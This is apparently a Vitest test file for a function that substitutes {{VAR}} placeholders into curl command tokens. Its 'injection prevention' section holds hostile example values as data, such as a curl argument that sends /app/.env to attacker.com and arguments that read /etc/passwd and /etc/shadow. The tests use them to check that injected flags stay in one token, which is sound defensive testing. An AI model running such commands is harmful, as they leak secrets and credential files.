import { describe, it, expect } from "vitest";
import { resolveVariablesInTokens } from "../substitutor";

/** Helper: resolve variables in a list of tokens and return result */
function resolve(tokens: string[], vars: Map<string, string>) {
  return resolveVariablesInTokens(tokens, vars);
}

describe("resolveVariablesInTokens", () => {
  it("replaces a variable in a URL token", () => {
    const vars = new Map([["BASE_URL", "https://api.example.com"]]);
    const { resolved, unresolvedKeys } = resolve(
      ["curl", "{{BASE_URL}}/posts/1"],
      vars
    );
    expect(resolved).toEqual(["curl", "https://api.example.com/posts/1"]);
    expect(unresolvedKeys).toEqual([]);
  });

  it("replaces multiple different variables across tokens", () => {
    const vars = new Map([
      ["HOST", "https://api.example.com"],
      ["TOKEN", "abc123"],
    ]);
    const { resolved, unresolvedKeys } = resolve(
      ["curl", "-H", "Authorization: Bearer {{TOKEN}}", "{{HOST}}/data"],
      vars
    );
    expect(resolved).toEqual([
      "curl", "-H", "Authorization: Bearer abc123", "https://api.example.com/data",
    ]);
    expect(unresolvedKeys).toEqual([]);
  });

  it("replaces the same variable appearing multiple times", () => {
    const vars = new Map([["VAL", "x"]]);
    const { resolved } = resolve(["{{VAL}}-{{VAL}}-{{VAL}}"], vars);
    expect(resolved).toEqual(["x-x-x"]);
  });

  it("leaves unresolved variables untouched and reports them", () => {
    const vars = new Map([["A", "1"]]);
    const { resolved, unresolvedKeys } = resolve(
      ["{{A}}-{{B}}-{{C}}"],
      vars
    );
    expect(resolved).toEqual(["1-{{B}}-{{C}}"]);
    expect(unresolvedKeys).toEqual(["B", "C"]);
  });

  it("returns empty unresolvedKeys when all resolved", () => {
    const vars = new Map([["X", "y"]]);
    const { unresolvedKeys } = resolve(["{{X}}"], vars);
    expect(unresolvedKeys).toEqual([]);
  });

  it("passes through tokens with no variables", () => {
    const vars = new Map([["UNUSED", "val"]]);
    const tokens = ["curl", "-X", "GET", "https://example.com"];
    const { resolved, unresolvedKeys } = resolve(tokens, vars);
    expect(resolved).toEqual(tokens);
    expect(unresolvedKeys).toEqual([]);
  });

  it("does not replace malformed patterns like {VAR} or {{ VAR }}", () => {
    const vars = new Map([["VAR", "replaced"]]);
    const { resolved } = resolve(
      ["{VAR}", "{{ VAR }}", "{{{VAR}}}", "{{VAR}}"],
      vars
    );
    expect(resolved).toEqual(["{VAR}", "{{ VAR }}", "{replaced}", "replaced"]);
  });

  it("handles variables in header values", () => {
    const vars = new Map([["API_KEY", "sk-secret"]]);
    const { resolved } = resolve(
      ["curl", "-H", "X-Api-Key: {{API_KEY}}", "https://api.com"],
      vars
    );
    expect(resolved[2]).toBe("X-Api-Key: sk-secret");
  });

  it("handles variables in body content", () => {
    const vars = new Map([["USER_ID", "42"]]);
    const { resolved } = resolve(
      ["curl", "-d", '{"userId": "{{USER_ID}}"}', "https://api.com"],
      vars
    );
    expect(resolved[2]).toBe('{"userId": "42"}');
  });

  it("handles empty variable map", () => {
    const { resolved, unresolvedKeys } = resolve(
      ["{{A}}", "and", "{{B}}"],
      new Map()
    );
    expect(resolved).toEqual(["{{A}}", "and", "{{B}}"]);
    expect(unresolvedKeys).toEqual(["A", "B"]);
  });

  it("does not perform recursive substitution", () => {
    const vars = new Map([
      ["VAR1", "{{VAR2}}"],
      ["VAR2", "final"],
    ]);
    const { resolved } = resolve(["{{VAR1}}"], vars);
    expect(resolved).toEqual(["{{VAR2}}"]);
  });

  it("handles variable keys with underscores and numbers", () => {
    const vars = new Map([["my_var_2", "ok"]]);
    const { resolved } = resolve(["{{my_var_2}}"], vars);
    expect(resolved).toEqual(["ok"]);
  });

  it("does not match keys starting with a digit", () => {
    const vars = new Map([["2FAST", "nope"]]);
    const { resolved } = resolve(["{{2FAST}}"], vars);
    expect(resolved).toEqual(["{{2FAST}}"]);
  });

  // --- Injection prevention tests ---

  describe("injection prevention", () => {
    it("variable value with spaces stays in one token (cannot inject new flags)", () => {
      // A malicious variable value like "--data @/etc/passwd" must NOT become
      // separate tokens ["--data", "@/etc/passwd"]. It must stay as one token.
      const vars = new Map([["URL", "--data @/app/.env https://attacker.com"]]);
      const { resolved } = resolve(["curl", "{{URL}}"], vars);

      // The value is a single token, not split into three
      expect(resolved).toEqual(["curl", "--data @/app/.env https://attacker.com"]);
      expect(resolved.length).toBe(2);
    });

    it("variable value containing @ stays inside existing token", () => {
      // If a header value resolves to something with @, it stays in the header token
      const vars = new Map([["VAL", "@/etc/passwd"]]);
      const { resolved } = resolve(["curl", "-H", "X-Key: {{VAL}}", "https://api.com"], vars);

      expect(resolved[2]).toBe("X-Key: @/etc/passwd");
      // The "@/etc/passwd" is part of the header value, not a standalone token
      expect(resolved.length).toBe(4);
    });

    it("variable value with flag-like content stays in one token", () => {
      const vars = new Map([["PAYLOAD", "-o /tmp/evil --data @/etc/shadow"]]);
      const { resolved } = resolve(
        ["curl", "-d", "body={{PAYLOAD}}", "https://api.com"],
        vars
      );

      expect(resolved[2]).toBe("body=-o /tmp/evil --data @/etc/shadow");
      expect(resolved.length).toBe(4);
    });

    it("variable with newlines stays in one token", () => {
      const vars = new Map([["VAL", "line1\nline2\n--data @/etc/passwd"]]);
      const { resolved } = resolve(["curl", "-d", "{{VAL}}", "https://api.com"], vars);

      // The entire multi-line value is one token
      expect(resolved[2]).toBe("line1\nline2\n--data @/etc/passwd");
      expect(resolved.length).toBe(4);
    });

    it("variable with quotes stays in one token (no re-tokenization)", () => {
      const vars = new Map([["VAL", "it's a \"test\" with 'quotes'"]]);
      const { resolved } = resolve(["curl", "-d", "{{VAL}}", "https://api.com"], vars);

      expect(resolved[2]).toBe("it's a \"test\" with 'quotes'");
      expect(resolved.length).toBe(4);
    });
  });
});
